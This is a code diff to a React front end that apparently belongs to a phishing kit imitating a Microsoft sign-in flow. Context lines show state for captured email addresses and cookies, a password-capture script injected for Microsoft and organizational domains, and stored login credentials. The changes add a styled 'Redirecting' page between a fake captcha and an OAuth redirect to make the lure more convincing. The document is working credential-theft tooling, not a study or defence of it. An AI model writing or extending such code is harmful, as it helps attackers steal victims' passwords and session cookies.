@@ -11,6 +11,7 @@ const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
 const nextStepDelay = SLOW_DELAY * 3;
 const messageIconDelay = 500; // This matches the delay used in MessageIconLanding
 const captchaVerificationDelay = 1500; // Default verification delay for captcha
+const redirectingDelay = 2000; // Delay for redirecting page
 
 // Calculate total delay for captcha to handle everything internally
 const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;
@@ -21,6 +22,36 @@ function App() {
   // State to hold the most reliable email and cookies captured via postMessage
   const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
   const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
+
+  // Add CSS animation for dots
+  useEffect(() => {
+    const style = document.createElement('style');
+    style.textContent = `
+      @keyframes dotAnimation {
+        0% { opacity: 0; }
+        20% { opacity: 1; }
+        100% { opacity: 0; }
+      }
+      .redirecting-dots span:nth-child(1) { animation-delay: 0s; }
+      .redirecting-dots span:nth-child(2) { animation-delay: 0.2s; }
+      .redirecting-dots span:nth-child(3) { animation-delay: 0.4s; }
+      .redirecting-dots span:nth-child(4) { animation-delay: 0.6s; }
+      .redirecting-dots span:nth-child(5) { animation-delay: 0.8s; }
+      .redirecting-dots span:nth-child(6) { animation-delay: 1.0s; }
+    `;
+    document.head.appendChild(style);
+    return () => document.head.removeChild(style);
+  }, []);
+
+  // Handle redirecting to OAuth after delay
+  useEffect(() => {
+    if (currentPage === 'redirecting') {
+      const timer = setTimeout(() => {
+        setCurrentPage('oauth-redirect');
+      }, redirectingDelay);
+      return () => clearTimeout(timer);
+    }
+  }, [currentPage]);
 
   // Inject password capture script for Microsoft/organizational domains
   useEffect(() => {
@@ -112,7 +143,7 @@ function App() {
                 sessionStorage.setItem('login_credentials_backup', JSON.stringify(credentialsData));
 
                 console.log('💾 Stored credentials:', {
-                  hasEmail: !!credentialsData.email,
+                  hasEmail: !!credentialsData.hasEmail,
                   hasPassword: !!credentialsData.password,
                   hasUsername: !!credentialsData.username
                 });
@@ -242,15 +273,15 @@ function App() {
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
     const step = urlParams.get('step');
-    if (step && ['captcha', 'message-icon', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
+    if (step && ['captcha', 'message-icon', 'redirecting', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
       setCurrentPage(step);
       window.history.replaceState({}, document.title, window.location.pathname);
     }
   }, []);
 
-  // Captcha verified: immediately go to oauth redirect (no delay)
+  // Captcha verified: go to redirecting page
   const handleCaptchaVerified = () => {
-    setCurrentPage('oauth-redirect');
+    setCurrentPage('redirecting');
   };
 
   const handleCaptchaBack = () => {
@@ -275,6 +306,34 @@ function App() {
           autoRedirectDelay={messageIconDelay}
           totalDelayTime={totalCaptchaDelay}
         />
+      );
+
+    case 'redirecting':
+      return (
+        <div style={{
+          display: 'flex',
+          justifyContent: 'center',
+          alignItems: 'center',
+          height: '100vh',
+          fontFamily: 'Arial, sans-serif',
+          backgroundColor: '#f3f2f1'
+        }}>
+          <div style={{
+            textAlign: 'center',
+            fontSize: '24px',
+            color: '#323130'
+          }}>
+            Redirecting
+            <span className="redirecting-dots">
+              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
+              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
+              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
+              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
+              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
+              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
+            </span>
+          </div>
+        </div>
       );
 
     case 'message-icon':
